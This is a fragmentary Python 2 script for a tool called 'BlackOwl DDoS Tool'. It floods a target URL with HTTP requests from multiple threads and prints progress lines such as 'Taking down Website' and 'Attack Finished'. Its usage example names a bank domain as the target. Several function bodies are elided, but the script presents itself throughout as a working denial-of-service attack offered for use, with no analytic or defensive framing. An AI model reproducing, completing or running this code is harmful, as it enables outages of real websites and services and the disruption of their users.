...
#   | - - - - - - - - - - - - - - - |   #
#   |  BlackOwl DDoS Tool 404       |   #
#   |  Denial of Service            |   #
#   |  Coded by TnHackerTn          |   #
#   | - - - - - - - - - - - - - - - |   #
#   |  python BlackOwl.py <url>     |   #
#   | - - - - - - - - - - - - - - - |   #
"""
import os, sys
import urllib2
...
def usage():
	print '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-'
	print '  BlackOwl DDoS Tool Denial of Service 404'
	print '  [URL] Exemple: http://bank.co.il'
	print '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-'
	print "\a"
print \
"""                   ...
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print "BlackOwl DDoS Tool:~# Taking down Website with packages of:~# %d bytes" % (request_counter)
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "BlackOwl DDoS Tool:~# %d Pacotes enviados !!!" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n BlackOwl DDoS Tool:~# Attack Finished"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="ajuda":
		...
		print "BlackOwl DDoS Tool:~# initiating attack"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
